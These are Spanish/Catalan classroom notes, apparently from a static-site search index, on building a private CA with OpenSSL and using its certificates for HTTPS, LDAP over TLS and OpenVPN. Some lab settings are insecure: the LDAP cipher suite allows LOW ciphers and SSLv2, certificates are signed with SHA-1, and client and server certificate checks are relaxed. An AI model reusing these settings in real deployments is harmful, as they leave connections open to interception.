[ Some-State ] :Barcelona Locality Name ( eg, city ) [] :Barcelona Organization Name ( eg, company ) [ Internet Widgits Pty Ltd ] :escola del treball Organizational Unit Name ( eg, section ) [] :dep informatica Common Name ( e.g. server FQDN or YOUR name ) [] :www.edt.org Email Address [] :admin@edt.org Please enter the following 'extra' attributes to be sent with your certificate request A challenge password [] :request password An optional company name [] :edt \u279c ll -rw-r--r-- 1 debian debian 1 ,2K mar 30 11 :48 server.csr -rw------- 1 debian debian 1 ,8K mar 30 11 :45 server.key una entidad certificadora a de firmar la peticion request del certificado y devolver un certificado.crt, como aremos nosotros de entidad CA lo autofirmaremos. # Fitxer de configuraci\u00f3 de la generaci\u00f3 de certificats: indica qu\u00e8 certifiquen \u279c cat ca/ca.conf basicConstraints = critical,CA:FALSE extendedKeyUsage = serverAuth,emailProtection # L'autoritat CA ha de signar el certificat \u279c openssl x509 -CA ca.crt -CAkey ca.key -req -in server.csr -days 365 -sha1 -extfile ca/ca.conf -CAcreateserial -out server.crt Signature ok subject = C = ca, ST = Barcelona, L = Barcelona, O = escola del treball, OU = dep informatica, CN = www.edt.org, emailAddress = admin@edt.org Getting CA Private Key Enter pass phrase for ca.key: # Mostrar el no de s\u00e8rie que genera la CA per a cada certificat que emet. \u279c cat ca.srl 777493C4F77FDEF98879C20B0EBE80A94E2B048E # la entidad le enviara al cliente el archivo server.crt # El client que ha sol\u00b7licitat el certificat pot validar el certificat respecte la seva clau privada \u279c openssl x509 -noout -modulus -in server.crt | openssl md5 ( stdin )= 1e560851e07dd9c2774474a44c16abd2 \u279c openssl rsa -noout -modulus -in server.key | openssl md5 Enter pass phrase for server.key: ( stdin )= 1e560851e07dd9c2774474a44c16abd2 passfrase A\u00f1adir una passfrase a una clave privada suma seguridad, ya que sin esa passfrase nadie podr\u00e1 utilizar la clave privada. inconvenientes : es que al arrancar el servicio apache pide la passfrase necesaria por cada certificado que tenga una. Ventajas : si no roban la llave privada, si no tienen la pasfrase no podr\u00e1n utilizarla. Al hacer modificaciones en una key se genera otra nueva, despu\u00e9s de modificar es recomendable remplazar con un mv . A\u00f1adir \u279c openssl rsa -des3 -in server.key -out passfrase.server.key writing RSA key Enter PEM pass phrase: Verifying - Enter PEM pass phrase: \u279c mv passfrase.server.key server.key Modificar \u279c openssl rsa -des3 -in server.key -out passfrase.new.server.key Enter pass phrase for server.key: writing RSA key Enter PEM pass phrase: Verifying - Enter PEM pass phrase: \u279c mv passfrase.new.server.key server.key Eliminar \u279c openssl rsa -in server.key -out delete-passfrase.server.key Enter pass phrase for server.key: writing RSA key Examinar contenido de certificados y llaves # contenido certificado \u279c openssl x509 -noout -text -in autosigned.server.crt # contenido clave privada \u279c openssl rsa -noout -text -in autosigned.server.key # verificar que el certificado y la llave privada se corresponden. \u279c openssl x509 -noout -modulus -in autosigned.server.crt | openssl md5 ( stdin )= 749c4e62abb2fcc4f16325f5ccbe5d24 \u279c openssl rsa -noout -modulus -in autosigned.server.key | openssl md5 ( stdin )= 749c4e62abb2fcc4f16325f5ccbe5d24 No se que [ root@hp01 m11 ] # openssl s_client -connect 172.17.0.2:443 --- GET / HTTP/1.1 Host: www.m11.cat --- GET / HTTP/1.1 Host: www.admin.cat [ root@hp01 m11 ] # curl -v -ssl https://www.m11.cat [ root@https / ] # openssl s_client -connect pop.gmail.com:995 USER edtasixm14 +OK send PASS PASS xxxxx +OK Welcome. STAT +OK 8 87440 LIST +OK 8 messages ( 87440 bytes ) 1 6928 2 7758 3 4844 4 5364 5 5071 6 35142 7 12120 8 10213 . QUIT DONE # conectar con sclient a un virtual host openssl s_client -servername www.web1.org -connect 172 .17.0.2:443 openssl s_client -CAfile cacert.pem -servername www.web1.org -connect 172 .17.0.2:443 # verificar \u279c tls19:https openssl verify -CAfile cacert.pem servercert.web1.pem # descargar certificado remoto \u279c tls19:https openssl s_client -servername www.web1.org -connect 172 .17.0.2:443 < /dev/null 2 > /dev/null | openssl x509 -outform PEM > downloaded.cert.pem \u279c tls19:https openssl x509 -noout -text -in downloaded.cert.pem Ldap tls Ldap con conexiones seguras TLS/SSL y startTLS. Generar certificados # genrar llaves privadas, del servidor. openssl genrsa -out cakey.pem 2048 openssl genrsa -out serverkey.pem 2048 # genrar certificado propio de la entidad CA por 365 dias openssl req -new -x509 -nodes -sha1 -days 365 -key cakey.pem -out cacrt.pem You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.' , the field will be left blank. ----- Country Name ( 2 letter code ) [ AU ] :ca State or Province Name ( full name ) [ Some-State ] :Barcelona Locality Name ( eg, city ) [] :Barcelona Organization Name ( eg, company ) [ Internet Widgits Pty Ltd ] :Varitat Absoluta Organizational Unit Name ( eg, section ) [] :Dep de certificats Common Name ( e.g. server FQDN or YOUR name ) [] :VeritatAbsoluta Email Address [] :admin@edt.org # generar una de certificado request para enviar a la entidad certificadora CA openssl req -new -key serverkey.pem -out servercsr.pem You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.' , the field will be left blank. ----- Country Name ( 2 letter code ) [ AU ] :ca State or Province Name ( full name ) [ Some-State ] :Barcelona Locality Name ( eg, city ) [] :Barcelona Organization Name ( eg, company ) [ Internet Widgits Pty Ltd ] :escola de mi casa Organizational Unit Name ( eg, section ) [] :dep informatica Common Name ( e.g. server FQDN or YOUR name ) [] :ldap.edt.org Email Address [] :admin@edt.org Please enter the following 'extra' attributes to be sent with your certificate request A challenge password [] :request password An optional company name [] :edt # Una entidad CA a de firmar el servercsr.pem y devolvernos un certificado.crt, como hago yo mismo de entidad cat ca.conf basicConstraints = critical,CA:FALSE extendedKeyUsage = serverAuth,emailProtection # Autoridad CA firmando el certificado openssl x509 -CA cacrt.pem -CAkey cakey.pem -req -in servercsr.pem -days 365 -sha1 -extfile ca.conf -CAcreateserial -out servercrt.pem Signature ok subject = C = ca, ST = Barcelona, L = Barcelona, O = escola de mi casa, OU = dep informatica, CN = ldap.edt.org, emailAddress = admin@edt.org Getting CA Private Key # archivos finales \u279c ll total 60K -rw-r--r-- 1 debian debian 83 abr 1 10 :14 ca.conf -rw-r--r-- 1 debian debian 1 ,5K abr 1 10 :23 cacrt.pem -rw-r--r-- 1 debian debian 41 abr 1 10 :35 cacrt.srl -rw------- 1 debian debian 1 ,7K abr 1 10 :14 cakey.pem -rw-r--r-- 1 debian debian 1 ,5K abr 1 10 :35 servercrt.pem -rw-r--r-- 1 debian debian 1 ,2K abr 1 10 :32 servercsr.pem -rw------- 1 debian debian 1 ,7K abr 1 10 :14 serverkey.pem Configuraci\u00f3n slapd.conf --- TLSCACertificateFile /etc/openldap/certs/cacrt.pem TLSCertificateFile /etc/openldap/certs/servercrt.pem TLSCertificateKeyFile /etc/openldap/certs/serverkey.pem TLSVerifyClient never TLSCipherSuite HIGH:MEDIUM:LOW:+SSLv2 --- ldap.conf --- TLS_CACERT /etc/openldap/certs/cacrt.pem SASL_NOCANON on URI ldap://ldap.edt.org BASE dc = edt,dc = org --- startup.sh --- /sbin/slapd -d0 -h \"ldap:/// ldaps:/// ldapi:///\" --- cliente ldap.conf TLS_CACERT /etc/ldap/cacrt.pem TLS_REQCERT allow URI ldap://ldap.edt.org BASE dc = edt,dc = org SASL_NOCANON on Comprobaciones ldapsearch -x -LLL -ZZ dn ldapsearch -x -LLL -ZZ -h ldap.edt.org -b 'dc=edt,dc=org' dn ldapsearch -x -LLL -H ldaps://ldap.edt.org dn openssl s_client -connect ldap.edt.org:636 Docker \u279c docker run --rm --name ldap.edt.org -h ldap.edt.org -p 389 :389 -p 636 :636 -d jorgepastorr/ldapserver19:tls OpenVpn Generar llaves servidor Primero creamos nuestra CA \u279c openssl genrsa -des3 -out cakey.pem 2048 \u279c openssl req -new -x509 -nodes -sha1 -days 365 -key cakey.pem -out cacert.pem Enter pass phrase for cakey.pem: You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.' , the field will be left blank. ----- Country Name ( 2 letter code ) [ AU ] :ca State or Province Name ( full name ) [ Some-State ] :Barcelona Locality Name ( eg, city ) [] :Barcelona Organization Name ( eg, company ) [ Internet Widgits Pty Ltd ] :Veritat absoluta Organizational Unit Name ( eg, section ) [] :Departament de certificats Common Name ( e.g. server FQDN or YOUR name ) [] :VeritatAbsoluta Email Address [] :admin@edt.org \u279c ll -rw-r--r-- 1 debian debian 1 ,5K mar 30 11 :24 cacert.pem -rw------- 1 debian debian 1 ,8K mar 30 11 :17 cakey.pem generar la llave del servidor y el request para enviar a la CA para que nos certifique. \u279c openssl dhparam -out dh2048.pem 2048 # llave del server \u279c openssl genrsa -out serverkey.pem 2048 Generating RSA private key, 2048 bit long modulus ( 2 primes ) .........................................+++++ ................................................................+++++ e is 65537 ( 0x010001 ) # request para la CA \u279c openssl req -new -key serverkey.pem -out serverreq.pem You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.' , the field will be left blank. ----- Country Name ( 2 letter code ) [ AU ] :ca State or Province Name ( full name ) [ Some-State ] :barcelona Locality Name ( eg, city ) [] :barcelona Organization Name ( eg, company ) [ Internet Widgits Pty Ltd ] :server vvpn Organizational Unit Name ( eg, section ) [] :VpnServer Common Name ( e.g. server FQDN or YOUR name ) [] :VpnServer Email Address [] : Please enter the following 'extra' attributes to be sent with your certificate request A challenge password [] :request password An optional company name [] :edt Como no tenemos CA externa, simulamos una y nos auto certificamos. fichero de extensiones para servidor: ext.server.conf basicConstraints = CA:FALSE nsCertType = server nsComment = \"OpenSSL Generated Server Certificate\" subjectKeyIdentifier = hash authorityKeyIdentifier = keyid,issuer:always extendedKeyUsage = serverAuth keyUsage = digitalSignature, keyEncipherment Generar certificado ( esto lo deber\u00eda hacer una certificadora externa a nosotros ) \u279c openssl x509 -CAkey cakey.pem -CA cacert.pem -req -in serverreq.pem -days 365 -CAcreateserial -extfile ext.server.conf -out servercert.pem Signature ok subject = C = ca, ST = barcelona, L = barcelona, O = server vvpn, OU = VpnServer, CN = VpnServer Getting CA Private Key Archivos generados: \u279c tls19:vpn ll total 64K -rw-r--r-- 1 debian debian 1 ,4K abr 3 19 :29 cacert.pem -rw-r--r-- 1 debian debian 41 abr 3 19 :40 cacert.srl -rw------- 1 debian debian 1 ,7K abr 3 19 :27 cakey.pem -rw-r--r-- 1 debian debian 424 abr 4 11 :39 dh2048.pem -rw-r--r-- 1 debian debian 301 abr 3 19 :12 ext.server.conf -rw-r--r-- 1 debian debian 1 ,8K abr 3 19 :37 servercert.pem -rw------- 1 debian debian 1 ,7K abr 3 19 :30 serverkey.pem -rw-r--r-- 1 debian debian 1 ,1K abr 3 19 :32 serverreq.pem Generar llaves cliente Lo recomendable es que cada cliente tenga una llave propia para conectar con el servidor, por lo tanto estos pasos se deben repetir por cada cliente que quiera conectar con el servidor. generar llave de cliente y request para certificar. \u279c openssl genrsa -out cliekey1.pem 2048 Generating RSA private key, 2048 bit long modulus ( 2 primes ) ........................................................................+++++ ....................................................+++++ e is 65537 ( 0x010001 ) # generar request ( quien soy ) \u279c openssl req -new -key cliekey1.pem -out cliereq1.pem You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.' , the field will be left blank. ----- Country Name ( 2 letter code ) [ AU ] :ca State or Province Name ( full name ) [ Some-State ] :barcelona Locality Name ( eg, city ) [] :barcelona Organization Name ( eg, company ) [ Internet Widgits Pty Ltd ] :cliente 1 server vpn Organizational Unit Name ( eg, section ) [] :cliente1 Common Name ( e.g. server FQDN or YOUR name ) [] :cliente1 Email Address [] : Please enter the following 'extra' attributes to be sent with your certificate request A challenge password [] :request password An optional company name [] :edt Generar certificado desde una CA, una CA verifica que eres quien dices ser. fichero de extensiones para cliente basicConstraints = CA:FALSE subjectKeyIdentifier = hash authorityKeyIdentifier = keyid,issuer:always \u279c openssl x509 -CAkey cakey.pem -CA cacert.pem -req -in cliereq1.pem -days 365 -CAcreateserial -extfile ext.client.conf -out cliecert1.pem Signature ok subject = C = ca, ST = barcelona, L = barcelona, O = cliente 1 server vpn, OU = cliente1, CN = cliente1 Getting CA Private Key Archivos generados para cliente: \u279c ll -rw-r--r-- 1 debian debian 1 ,4K abr 3 19 :29 cacert.pem -rw-r--r-- 1 debian debian 1 ,6K abr 3 19 :40 cliecert1.pem -rw------- 1 debian debian 1 ,7K abr 3 19 :38 cliekey1.pem -rw-r--r-- 1 debian debian 3 ,6K abr 3 19 :15 client.conf -rw-r--r-- 1 debian debian 1 ,1K abr 3 19 :40 cliereq1.pem -rw-r--r-- 1 debian debian 113 abr 3 19 :13 ext.client.conf T\u00fanel manual Una manera de verificar que los certificados funcionan correctamente es creando un t\u00fanel manualmente, si funcionan correctamente pasamos va configurar el servidor. pc02 \u279c sudo openvpn --remote pc03 --dev tun1 --ifconfig 10 .4.0.1 10 .4.0.2 --tls-server --dh dh2048.pem --ca cacert.pem --cert servercert.pem --key serverkey.pem --reneg-sec 60 [ jorge@pc03 certs ] $ sudo openvpn --remote pc02 --dev tun1 --ifconfig 10 .4.0.2 10 .4.0.1 --tls-client --ca cacert.pem --cert cliecert1.pem --key cliekey1.pem --reneg-sec 60 Configurar Servidor Primero de todo hacemos una copia del servicio y lo modificamos para tener una configuraci\u00f3n como se ve en el siguiente recuadro [ fedora@aws ~ ] $ sudo cp /lib/systemd/system/openvpn-server@.service /etc/systemd/system/. [ fedora@aws ~ ] $ cat /etc/systemd/system/openvpn-server \\@ .service [ Unit ] Description = OpenVPN service for %I hisx After = syslog.target network-online.target [ Service ] Type = forking PrivateTmp = true ExecStartPre = /usr/bin/echo serveri %i %I PIDFile = /var/run/openvpn-server/%i.pid ExecStart = /usr/sbin/openvpn --daemon --writepid /var/run/openvpn-server/%i.pid --cd /etc/openvpn/ --config %i.conf [ Install ] WantedBy = multi-user.target Cogemos el archivo de configuraci\u00f3n de muestra y lo modificamos de la siguiente manera. [ fedora@aws ~ ] $ cp /usr/share/doc/openvpn/sample/sample-config-files/server.conf . [ fedora@aws ~ ] $ sudo cp server.conf /etc/openvpn/confserver.conf [ fedora@aws ~ ] $ cat /etc/openvpn/confserver.conf port 1194 proto udp dev tun # interfaz de vpn # nuestras llaves para el server ca /etc/openvpn/keys/cacert.pem cert /etc/openvpn/keys/servercert.pem key /etc/openvpn/keys/serverkey.pem dh /etc/openvpn/keys/dh2048.pem server 10 .8.0.0 255 .255.255.0 # red del vpn ifconfig-pool-persist ipp.txt client-to-client # clientes se ven entre ellos ; duplicate-cn # no permitir diferentes conexxiones con la misma llave keepalive 10 120 cipher AES-256-CBC comp-lzo # compresion persist-key persist-tun # datos de logs status openvpn-status.log verb 3 explicit-exit-notify 1 Los archivos de configuraci\u00f3n quedan con la siguiente estructura. [ fedora@ip-172-31-92-8 ~ ] $ sudo tree /etc/openvpn/ /etc/openvpn/ \u251c\u2500\u2500 client \u251c\u2500\u2500 confserver.conf \u251c\u2500\u2500 ipp.txt \u251c\u2500\u2500 keys \u2502 \u251c\u2500\u2500 cacert.pem \u2502 \u251c\u2500\u2500 dh2048.pem \u2502 \u251c\u2500\u2500 servercert.pem \u2502 \u2514\u2500\u2500 serverkey.pem \u251c\u2500\u2500 openvpn-status.log \u2514\u2500\u2500 server Poner en marcha el servidor. Al poner en marcha el servidor Hay que tener en cuenta que hemos modificado un dominio manualmente, por eso se han de recargar. Otra cosa a tener en cuenta es que en el start, hay que indicar el nombre del archivo de configuraci\u00f3n openvpn-server@confserver # recargar los dominios [ fedora@aws ~ ] $ sudo systemctl daemon-reload # encender el servidor [ fedora@aws ~ ] $ sudo systemctl start openvpn-server@confserver.service # comprovar interfaz creada [ fedora@aws ] $ ip a s tun0 8 : tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 100 link/none inet 10 .8.0.1 peer 10 .8.0.2/32 scope global tun0 valid_lft forever preferred_lft forever inet6 fe80::b502:a827:5610:7c23/64 scope link stable-privacy valid_lft forever preferred_lft forever Cliente En la configuraci\u00f3n del cliente es mas simple, ya que solo se a de modificar el archivo de configuraci\u00f3n, agregar las llaves del cliente en su sitio y arrancar el servicio. Todos estos pasos se han de hacer por cada cliente con sus claves propias. Archivo de configuraci\u00f3n: [ jorge@pc03 ] $ sudo cat client/confclient.conf client dev tun proto udp remote aws 1194 # ip/host port del servidor remoto resolv-retry infinite nobind persist-key persist-tun # certificados ca /etc/openvpn/keys/cacert.pem cert /etc/openvpn/keys/cliecert1.pem key /etc/openvpn/keys/cliekey1.pem remote-cert-tls server cipher AES-256-CBC comp-lzo verb 3 Se colocan las llaves en su sitio indicado [ jorge@pc03 openvpn ] $ sudo tree . \u251c\u2500\u2500 client \u2502 \u2514\u2500\u2500 confclient.conf \u251c\u2500\u2500 keys \u2502 \u251c\u2500\u2500 cacert.pem \u2502 \u251c\u2500\u2500 cliecert1.pem \u2502 \u2514\u2500\u2500 cliekey1.pem \u2514\u2500\u2500 server Como no tengo resoluci\u00f3n dns indico la resoluci\u00f3n en el /etc/hosts [ jorge@pc03 ] $ cat /etc/hosts 127 .0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4 ::1 localhost localhost.localdomain localhost6 localhost6.localdomain6 3 .86.219.56 aws Arrancar y comprobar. # arrancar servicio, con el nombre del archivo de configuraci\u00f3n [ jorge@pc03 ] $ sudo systemctl start openvpn-client@confclient # verificar que se a creado la interfaz [ jorge@pc03 ] $ ip a s tun0 9 : tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 100 link/none inet 10 .8.0.6 peer 10 .8.0.5/32 scope global tun0 valid_lft forever preferred_lft forever inet6 fe80::7b5f:a77b:2a32:be1e/64 scope link stable-privacy valid_lft forever preferred_lft forever # comprovar que llego al otro extremo [ jorge@pc03 ] $ curl 10 .8.0.1:13 04 APR 2020 11 :26:59 UTC Extensiones fichero especifico de extensi\u00f3n Generar un certificado de servidor ldap que correr\u00e1 en un container llamado ldap.edt.org pero que tambi\u00e9n acepte conexiones realizadas en nip 172.17.0.2, 127.0.0.1, ldaps://mysecureldapserver.org . Creo un fichero de extensiones y defino el subjectAltName para cada uno de los nombres alternativos. ext.alterare.conf basicConstraints = CA:FALSE extendedKeyUsage = serverAuth subjectAltName = IP:172.17.0.2,IP:127.0.0.1,email:copy,URI:ldaps://mysecureldapserver.org \u279c ldap openssl x509 -CAkey cakey.pem -CA cacrt.pem -req -in serverreq.pem -days 365 -CAcreateserial -extfile ext.alterate.conf -out servercert.alternate.pem Signature ok subject = C = ca, ST = barcelona, L = barcelona, O = edt, OU = EDT, CN = ldap.edt.org Getting CA Private Key \u279c ldap openssl x509 -noout -text -in servercert.alternate.pem Certificate: Data: Version: 3 ( 0x2 ) Serial Number: 7a:e9:d4:14:65:f2:8e:66:aa:9c:0f:88:33:24:8c:cb:21:02:05:dc Signature Algorithm: sha256WithRSAEncryption Issuer: C = ca, ST = Barcelona, L = Barcelona, O = Veritat absoluta, OU = departament certificats, CN = VeritatAbsoluta Validity Not Before: Apr 6 08 :54:33 2020 GMT Not After : Apr 6 08 :54:33 2021 GMT Subject: C = ca, ST = barcelona, L = barcelona, O = edt, OU = EDT, CN = ldap.edt.org Subject Public Key Info: ... X509v3 extensions: X509v3 Basic Constraints: CA:FALSE X509v3 Extended Key Usage: TLS Web Server Authentication X509v3 Subject Alternative Name: IP Address:172.17.0.2, IP Address:127.0.0.1, URI:ldaps://mysecureldapserver.org fichero global fedora: /etc/pki/tls/openssl.cnf , debian: /etc/ssl/openssl.cnf openssl.cnf ... [ my_client ] basicConstraints = CA:FALSE subjectKeyIdentifier = hash authorityKeyIdentifier = keyid,issuer:always [ my_server ] basicConstraints = CA:FALSE nsCertType = server nsComment = \"OpenSSL Generated Server Certificate\" subjectKeyIdentifier = hash authorityKeyIdentifier = keyid,issuer:always extendedKeyUsage = serverAuth keyUsage = digitalSignature, keyEncipherment ... Certificar usando la extensi\u00f3n del fichero global # Ca utilizando extension de archivo de configuraci\u00f3n \u279c ldap openssl x509 -CAkey cakey.pem -CA cacrt.pem -req -in serverreq.pem -days 365 -CAcreateserial -extfile /etc/ssl/openssl.cnf -extensions my_client -out servercert.alternate.pem # certificado autofirmado \u279c ldap openssl req -new -x509 -key cakey.pem -config openssl.cnf -extensions usr_cert -out cert1.pem","title":"Certificados Digitales"},{"location":"seguridad/Certificados-Digitales/#certificados-digitales","text":"","title":"Certificados Digitales"},{"location":"seguridad/Certificados-Digitales/#tlsssl-https","text":"","title":"TLS/SSL (HTTPS)"},{"location":"seguridad/Certificados-Digitales/#generacio-de-claus-requests-i-certs","text":"","title":"Generaci\u00f3 de claus, requests i certs"},{"location":"seguridad/Certificados-Digitales/#certificado-autofirmado","text":"openssl req -new -x509 -days 3650 -nodes -keyout serverkey.auto1.pem -out servercert.auto1.pem","title":"Certificado autofirmado"},{"location":"seguridad/Certificados-Digitales/#creacion-de-clave-privada-y-certificado-autofirmado","text":"openssl genrsa -out serverkey.auto2.pem openssl req -new -x509 -days 3650 -nodes -key serverkey.auto2.pem -out servercert.auto2.pem","title":"Creaci\u00f3n de clave privada y certificado autofirmado"},{"location":"seguridad/Certificados-Digitales/#creacion-de-clave-privada-request-i-certificacion","text":"openssl genrsa -out serverkey.web1.pem openssl req -new -key serverkey.web1.pem -out serverreq.web1.pem openssl x509 -CAkey cakey.pem -CA cacert.pem -req -in serverreq.web1.pem -days 3650 -CAcreateserial -out servercert.web1.pem","title":"Creaci\u00f3n de clave privada, request i certificaci\u00f3n"},{"location":"seguridad/Certificados-Digitales/#creacion-de-clave-provada","text":"Petici\u00f3n de certificaci\u00f3n y firma de la certificaci\u00f3n usando fitchero de configuraci\u00f3n Fitxer exemple de configuraci\u00f3 parcial de openssl: #ca.conf basicConstraints = critical,CA:FALSE extendedKeyUsage = serverAuth,emailProtection openssl genrsa -out serverkey.web2.pem openssl req -new -key serverkey.web2.pem -out serverreq.web2.pem openssl x509 -CAkey cakey.pem -CA cacert.pem -req -in serverreq.web2.pem -days 3650 -CAcreateserial -extfile ca.conf -out servercert.web2.pem","title":"Creaci\u00f3n de clave provada"},{"location":"seguridad/Certificados-Digitales/#request-sin-interactivo","text":"# Generar el certificat + clau privada autosignats openssl req -x509 -nodes -days 365 -sha256 \\ -subj '/C=ca/ST=Barcelona/L=Barcelona/CN=www.edt.org' \\ -newkey rsa:2048 -keyout mykey.pem -out mycert.pem \u279c openssl req -new -x509 -nodes -out mycrt.pem -keyout mykey.pem Generating a RSA private key ....................................+++++ .........+++++ writing new private key to 'mykey.pem' ----- You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.' , the field will be left blank. ----- Country Name ( 2 letter code ) [ AU ] :ca State or Province Name ( full name ) [ Some-State ] :barcelona Locality Name ( eg, city ) [] :Barcelona Organization Name ( eg, company ) [ Internet Widgits Pty Ltd ] :escola del treball Organizational Unit Name ( eg, section ) [] :departament informatica Common Name ( e.g. server FQDN or YOUR name ) [] :www.edt.org Email Address [] :admin@edt.org","title":"Request sin interactivo"},{"location":"seguridad/Certificados-Digitales/#crear-una-ca-propia","text":"# generar clave privada encriptada con des3 i passfrase (formato PEM) \u279c openssl genrsa -des3 -out ca.key 2048 # generar el certificat x509 pr\u00f2pi de l'entitat CA (per a 365 dies) en format PEM \u279c openssl req -new -x509 -nodes -sha1 -days 365 -key ca.key -out ca.crt Enter pass phrase for ca.key: You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.' , the field will be left blank. ----- Country Name ( 2 letter code ) [ AU ] :ca State or Province Name ( full name ) [ Some-State ] :Barcelona Locality Name ( eg, city ) [] :Barcelona Organization Name ( eg, company ) [ Internet Widgits Pty Ltd ] :Veritat absoluta Organizational Unit Name ( eg, section ) [] :Departament de certificats Common Name ( e.g. server FQDN or YOUR name ) [] :VeritatAbsoluta Email Address [] :admin@edt.org \u279c ll -rw-r--r-- 1 debian debian 1 ,5K mar 30 11 :24 ca.crt -rw------- 1 debian debian 1 ,8K mar 30 11 :17 ca.key","title":"Crear una CA propia"},{"location":"seguridad/Certificados-Digitales/#contenido-fisico-y-logico","text":"# contenido fisico \u279c cat ca.key -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4 ,ENCRYPTED DEK-Info: DES-EDE3-CBC,7EB452B3EA57B216 gtG861azfOG/vZblyVumXLzx9SvFAT3shENQQxNqjW+PMUO9+aB15oNwASSgj1X2 SGRTEZtViAZdo1B5K8N3nhArTWULsIpHP5EiiS1qDYaFQcU38+Akzw == -----END RSA PRIVATE KEY----- # contenido logico \u279c openssl rsa -noout -text -in ca.key Enter pass phrase for ca.key: RSA Private-Key: ( 2048 bit, 2 primes ) modulus: 00 :c8:72:8a:93:51:19:0a:58:d6:45:8f:2e:1b:24: cd:e9:0d:5a:91:69:2f:e9:49:fb:56:78:68:9e:94: ... # ca.crt \u279c openssl x509 -noout -text -in ca.crt Certificate: Data: Version: 3 ( 0x2 ) Serial Number: 56 :b0:8d:ea:f1:e0:ea:b6:ca:ca:36:b1:56:35:54:9b:32:e1:87:11 Signature Algorithm: sha1WithRSAEncryption Issuer: C = ca, ST = Barcelona, L = Barcelona, O = Veritat absoluta, OU = Departament de certificats, CN = VeritatAbsoluta, emailAddress = admin@edt.org Validity Not Before: Mar 30 09 :24:14 2020 GMT Not After : Mar 30 09 :24:14 2021 GMT","title":"Contenido f\u00edsico y l\u00f3gico"},{"location":"seguridad/Certificados-Digitales/#crear-certificado-servidor-real","text":"# Crear una clau privada per al servidor # \u00e9s en format PEM, de 2048 bits i xifrada en 3DES. Utilitza passfrase \u279c openssl genrsa -des3 -out server.key 2048 # Generar una petici\u00f3 de certificat request per enviar a l'entitat certificadora CA \u279c openssl req -new -key server.key -out server.csr Enter pass phrase for server.key: You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.' , the field will be left blank. ----- Country Name ( 2 letter code ) [ AU ] :ca State or Province Name ( full name ) [ Some-State ] :Barcelona Locality Name ( eg, city ) [] :Barcelona Organization Name ( eg, company ) [ Internet Widgits Pty Ltd ] :escola del treball Organizational Unit Name ( eg, section ) [] :dep informatica Common Name ( e.g. server FQDN or YOUR name ) [] :www.edt.org Email Address [] :admin@edt.org Please enter the following 'extra' attributes to be sent with your certificate request A challenge password [] :request password An optional company name [] :edt \u279c ll -rw-r--r-- 1 debian debian 1 ,2K mar 30 11 :48 server.csr -rw------- 1 debian debian 1 ,8K mar 30 11 :45 server.key una entidad certificadora a de firmar la peticion request del certificado y devolver un certificado.crt, como aremos nosotros de entidad CA lo autofirmaremos. # Fitxer de configuraci\u00f3 de la generaci\u00f3 de certificats: indica qu\u00e8 certifiquen \u279c cat ca/ca.conf basicConstraints = critical,CA:FALSE extendedKeyUsage = serverAuth,emailProtection # L'autoritat CA ha de signar el certificat \u279c openssl x509 -CA ca.crt -CAkey ca.key -req -in server.csr -days 365 -sha1 -extfile ca/ca.conf -CAcreateserial -out server.crt Signature ok subject = C = ca, ST = Barcelona, L = Barcelona, O = escola del treball, OU = dep informatica, CN = www.edt.org, emailAddress = admin@edt.org Getting CA Private Key Enter pass phrase for ca.key: # Mostrar el no de s\u00e8rie que genera la CA per a cada certificat que emet. \u279c cat ca.srl 777493C4F77FDEF98879C20B0EBE80A94E2B048E # la entidad le enviara al cliente el archivo server.crt # El client que ha sol\u00b7licitat el certificat pot validar el certificat respecte la seva clau privada \u279c openssl x509 -noout -modulus -in server.crt | openssl md5 ( stdin )= 1e560851e07dd9c2774474a44c16abd2 \u279c openssl rsa -noout -modulus -in server.key | openssl md5 Enter pass phrase for server.key: ( stdin )= 1e560851e07dd9c2774474a44c16abd2","title":"crear certificado servidor real"},{"location":"seguridad/Certificados-Digitales/#passfrase","text":"A\u00f1adir una passfrase a una clave privada suma seguridad, ya que sin esa passfrase nadie podr\u00e1 utilizar la clave privada. inconvenientes : es que al arrancar el servicio apache pide la passfrase necesaria por cada certificado que tenga una. Ventajas : si no roban la llave privada, si no tienen la pasfrase no podr\u00e1n utilizarla. Al hacer modificaciones en una key se genera otra nueva, despu\u00e9s de modificar es recomendable remplazar con un mv .","title":"passfrase"},{"location":"seguridad/Certificados-Digitales/#anadir","text":"\u279c openssl rsa -des3 -in server.key -out passfrase.server.key writing RSA key Enter PEM pass phrase: Verifying - Enter PEM pass phrase: \u279c mv passfrase.server.key server.key","title":"A\u00f1adir"},{"location":"seguridad/Certificados-Digitales/#modificar","text":"\u279c openssl rsa -des3 -in server.key -out passfrase.new.server.key Enter pass phrase for server.key: writing RSA key Enter PEM pass phrase: Verifying - Enter PEM pass phrase: \u279c mv passfrase.new.server.key server.key","title":"Modificar"},{"location":"seguridad/Certificados-Digitales/#eliminar","text":"\u279c openssl rsa -in server.key -out delete-passfrase.server.key Enter pass phrase for server.key: writing RSA key","title":"Eliminar"},{"location":"seguridad/Certificados-Digitales/#examinar-contenido-de-certificados-y-llaves","text":"# contenido certificado \u279c openssl x509 -noout -text -in autosigned.server.crt # contenido clave privada \u279c openssl rsa -noout -text -in 